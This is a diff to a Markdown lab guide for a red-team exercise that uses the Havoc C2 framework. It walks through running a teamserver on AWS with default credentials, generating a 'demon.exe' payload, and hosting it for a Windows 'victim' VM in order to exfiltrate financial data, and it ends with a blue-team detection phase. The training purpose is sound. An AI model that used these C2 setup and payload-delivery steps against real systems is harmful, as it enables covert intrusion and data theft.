@@ -9,7 +9,7 @@
 >For this particular lab, you will be required to **have the two VM's in two separate tabs**. We will start on the *Windows VM*. 
 
 ---
-### Documentation and scenario : 
+## Documentation and scenario : 
 
 **What is Havoc?**
 
@@ -43,11 +43,11 @@ If you want to dive a bit deeper, check the [Havoc Official GitHub](https://gith
  - **Why are we doing this?** By putting the backend in the cloud, we protect our true identity (the Ubuntu VM). The victim will only ever see connections going out to a public AWS IP address, which often blends in with legitimate corporate cloud traffic.
 
 >[!IMPORTANT]
-> **You** will act as both the Red Teamer and the victim. Pay close attention to which machine (Windows, Ubuntu, or AWS) you are executing commands on. All sensitive data meant to be exfiltrated is located in the **Lab Directory**.
+> **You** will act as both the Red Teamer and the victim. Pay close attention to which machine (Windows, Ubuntu, or AWS) you are executing commands on. For this particular lab you will need to have two tabs open : One for the **Ubuntu VM** and another for the **Windows VM**. All sensitive data meant to be exfiltrated is located in the **Lab Directory**.
 
 ---
 
-### AWS Setup: (!!! NOTE : You will need to do this part on your personal computer)
+## AWS Setup: (!!! NOTE : You will need to do this part on your personal computer)
 
  - Before we dive in to the actual Lab Exercise, we need an **AWS Free Tier Account**. If you don't have an AWS Account and want a step by step guide for the AWS Free Tier account, check out **Phase 1** of the [ScoutSuite Lab](/Cards/IC/labs/scoutsuite.md). 
 
@@ -126,7 +126,8 @@ Once you have your AWS Account set up, let's get an **EC2 Instance** up and runn
  On the right-side summary panel, click **Launch instance**.
 
 ---
-### Phase 1 : Setup and Objective
+## Phase 1 : Setup and Objective
+### Environment: Windows VM
 
 We assume initial access to a *Windows 11* System, and our objective is to exfiltrate the sensitive financial databases without getting caught.
 
@@ -144,14 +145,33 @@ cd Desktop\Labs\Havoc
 
 ---
 
-### Phase 2: Staging the Cloud Infrastructure (The "Mothership") 
+## Phase 2: Staging the Cloud Infrastructure & Connecting the Command Center
+### Environment: [Ubuntu VM] -> [AWS EC2]
 
-As a professional attacker, you need to spin up your backend infrastructure before deploying malware. 
+As a professional attacker, you need to spin up your backend infrastructure before deploying malware. We will use the *Ubuntu VM* to connect to our AWS cloud and set up the "Mothership", then connect our local user interface to it.
 
-- *Step 1 (AWS):* Log into your AWS Console, spin up your EC2 Instance, and **ensure your Security Group allows inbound traffic on port 40056 (for the Client) and port 80/443 (for the Victim payload).**
-- *Step 2 (AWS Shell):* Connect to your AWS instance via SSH. Download Havoc, compile the Teamserver, and start it using the default profile.
+>[!NOTE]
+> If you have not yet moved the **.pem** file into the **Ubuntu VM**, now's the time. To access the VM's clipboard, type **ctrl+alt+shift** and a small window will pop up.
+> Paste the copied **RSA Key** in there, create a file named **havoc-key.pem** using nano, and **ctrl+shift+v** to paste it into the text editor.
+> Type **ctrl+s** and then **ctrl+x** to save and exit nano. Your should now have your RSA key saved. 
+
+- Step 1 (Connect to AWS): On your *Ubuntu VM*, open a terminal and locate the havoc-key.pem file you saved earlier. Set the correct permissions and SSH into your AWS EC2 instance (replace <YOUR_AWS_PUBLIC_IP> with your actual EC2 IP):
 
 ```bash
+chmod 400 havoc-key.pem
+ssh -i "havoc-key.pem" ubuntu@<YOUR_AWS_PUBLIC_IP>
+```
+
+ - Step 2 (Build and Start Teamserver): You are now inside the AWS EC2 Shell. Since this is a fresh Ubuntu server, we must install the necessary build tools and dependencies before compiling Havoc.
+
+```bash
+# Install dependencies
+sudo apt update
+sudo apt install -y git build-essential musl-dev
+sudo add-apt-repository ppa:longsleep/golang-backports -y
+sudo apt update
+sudo apt install -y golang-go
+
 # Clone the repo and build the teamserver
 git clone [https://github.com/HavocFramework/Havoc.git](https://github.com/HavocFramework/Havoc.git)
 cd Havoc
@@ -161,52 +181,41 @@ make ts-build
 ./havoc server --profile ./profiles/havoc.yaotl -v
 ```
 
-<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_TEAMSERVER_PORNIT_PE_AWS_AICI]" />
-
-
 >[!IMPORTANT]
-> Leave the SSH terminal open so the Teamserver keeps running. **Note down your AWS Public IP address**, you will need it for the next step.  
+> Leave this SSH terminal open so the Teamserver keeps running. Note down your AWS Public IP address, you will need it for the next step.
 
-
----
-
-### Phase 3: Connecting the Command Center
-
-Now that the backend is live in the cloud, we will connect our local user interface to it.
-
-- Open up an **Ubuntu Shell** terminal on your local VM.
-- Start the pre-installed Havoc Client.
+Step 3 (Start the Client): Open a NEW tab/terminal on your Ubuntu VM (do not close the SSH session). Start the pre-installed Havoc Client:
 
 ```bash
 havoc-client
 ```
 
-- A login screen will appear. Fill in the connection details:
-  - **Host:** `<YOUR_AWS_PUBLIC_IP>`
-  - **Port:** `40056`
-  - **User:** `5pider` (Default)
-  - **Password:** `password1234` (Default)
+A login screen will appear. Fill in the connection details:
 
-<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_LOGIN_SCREEN_HAVOC_AICI]" />
+    - Host: <YOUR_AWS_PUBLIC_IP>
+
+    - Port: 40056
+
+    - User: 5pider (Default)
+
+    - Password: password1234 (Default)
 
 Once connected, you are inside the Havoc dashboard!
 
-- **Create a Listener:** Go to *View -> Listeners -> Add*. Set it to HTTP and input your AWS Public IP in the 'Hosts' field. Click Save.
-- **Generate the Payload:** Go to *Attack -> Payload*. Select your HTTP Listener, choose 'Windows' and 'Executable (.exe)'. Click Generate and save the file as `demon.exe`.
+Create a Listener: Go to View -> Listeners -> Add. Set it to HTTP and input your AWS Public IP in the 'Hosts' field. Click Save.
 
-<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_PAYLOAD_GENERATOR_AICI]" />
+Generate the Payload: Go to Attack -> Payload. Select your HTTP Listener, choose 'Windows' and 'Executable (.exe)'. Click Generate and save the file as demon.exe.
 
-- Start a quick Python web server on the Ubuntu VM to host the `demon.exe` so the victim machine can download it:
+Start a quick Python web server on the Ubuntu VM to host the demon.exe so the victim machine can download it (make sure you run this in the directory where demon.exe was saved):
 
 ```bash
 python3 -m http.server 8000
 ```
 
----
+## Phase 3: Payload Delivery & Exfiltration
+### Environment: [Windows VM] (Victim) & [Ubuntu VM] (Attacker)
 
-### Phase 4: Payload Delivery & Exfiltration
-
-We now switch to the compromised Windows machine to deliver the payload and execute the attack.
+We now switch to the compromised *Windows VM* to deliver the payload and execute the attack.
 
 - Download the Havoc Demon directly from our Ubuntu server. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**
 
@@ -238,7 +247,8 @@ Once downloaded, you can find the file in your Havoc Loot module (View -> Loot).
 
 ---
 
-### Phase 5: Blue Team Detection
+## Phase 4: Blue Team Detection
+### Environment : Windows VM
 
 The attacker used the cloud to hide their identity, but malware must still run on the endpoint. Let's hunt for the active C2 connection.
 
